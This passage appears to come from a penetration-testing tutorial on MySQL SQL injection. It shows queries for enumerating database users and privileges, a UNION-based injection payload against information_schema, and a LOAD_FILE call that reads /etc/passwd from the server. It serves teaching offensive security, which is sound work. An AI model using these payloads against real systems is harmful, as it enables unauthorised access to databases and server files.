
in `MySQL`, the DB user must have the `FILE` privilege to load a file's content into a table and then dump data from that table and read files.


So, let us start by gathering data about our user privileges within the database to decide whether we will read and/or write files to the back-end server.

```sql
SELECT USER()
SELECT CURRENT_USER()
SELECT user from mysql.user
```

```sql
SELECT super_priv FROM mysql.user
```

```sql
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
```

---

## LOAD_FILE

```sql
SELECT LOAD_FILE('/etc/passwd');
```

We will only be able to read the file if the OS user running MySQL has enough privileges to read it.

